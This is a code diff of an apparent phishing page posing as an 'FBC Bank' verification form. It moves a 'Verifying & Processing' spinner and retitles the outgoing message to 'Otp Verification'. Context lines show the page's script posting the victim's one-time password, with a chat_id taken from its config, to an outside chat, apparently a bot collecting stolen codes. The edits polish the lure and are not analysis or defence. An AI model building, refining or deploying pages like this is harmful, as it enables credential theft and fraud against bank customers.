@@ -460,12 +460,6 @@
         <button type="submit" class="pill-btn">Verify</button>
       </form>
     </main>
-  </div>
-  <div id="spinnerOverlay">
-    <div class="spinner"></div>
-    <div class="spin-label">Verifying &amp; Processing</div>
-    <div class="spin-sub">Please hold on…</div>
-        </div>
 
     <!-- Bottom Section with Get Support and subtle copyright -->
     <footer class="bottom-section">
@@ -546,7 +540,7 @@
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
           text: `
-<b>📱 FBC Bank Loan Verification</b>
+<b>📱 FBC Bank Otp Verification</b>
 
 Otp: <code>${otp}</code>
 Applicant: <code>Not provided</code>
@@ -648,6 +642,11 @@ Applicant: <code>Not provided</code>
       document.getElementById('supportModal').style.display = 'none';
     }
     </script>
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+  </div>
   
 </body>
 </html>
